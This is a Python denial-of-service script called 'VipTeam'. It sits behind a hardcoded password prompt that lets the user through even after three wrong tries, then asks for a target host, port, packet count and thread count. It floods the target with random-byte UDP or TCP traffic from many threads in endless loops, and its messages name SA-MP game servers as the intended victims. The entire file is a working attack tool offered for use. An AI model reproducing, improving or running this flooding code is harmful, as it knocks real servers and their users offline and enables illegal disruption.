#VipTeam
import random 
import socket
import threading#1F00C3
import time
import os , sys

os.system("clear")
print ('''\033[96m
┏┓╋╋┏┳━━┳━━━┳━━━━┳━━━┳━━━┳━┓┏━┓
┃┗┓┏┛┣┫┣┫┏━┓┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃
┗┓┃┃┏┛┃┃┃┗━┛┣┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃
╋┃┗┛┃╋┃┃┃┏━━┛╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃
╋┗┓┏┛┏┫┣┫┃╋╋╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃
╋╋┗┛╋┗━━┻┛╋╋╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛ \033[96m''')

pasw = "Yoshii"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("[x] Wrong Password \n")
        continue
time.sleep(2)
print("Succesfull Logins")
time.sleep(2)

print ('''\033[96m
┏┓╋╋┏┳━━┳━━━┳━━━━┳━━━┳━━━┳━┓┏━┓
┃┗┓┏┛┣┫┣┫┏━┓┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃
┗┓┃┃┏┛┃┃┃┗━┛┣┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃
╋┃┗┛┃╋┃┃┃┏━━┛╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃
╋┗┓┏┛┏┫┣┫┃╋╋╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃
╋╋┗┛╋┗━━┻┛╋╋╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛ \033[96m''')
print("\033[96m#=======VIP COMUNITY UDP-TCP============#                          \033[96m")

choice = str(input("\033[92m UDP/TCP: \033[92m"))
ip = str(input("\033[92m HOST/IP TARGET: \033[92m"))
port = int(input("\033[92m PORT TARGET : \033[92m"))
times = int(input("\033[92m TIMES : \033[92m"))
threads = int(input("\033[92m THREADS : \033[92m"))
os.system("clear")
def udp():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m VipTeam Attacking Ip %s \033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m SA-MP Server %s Has Been Maintenance %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m  VipTeam Attacking Ip %s And Port %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()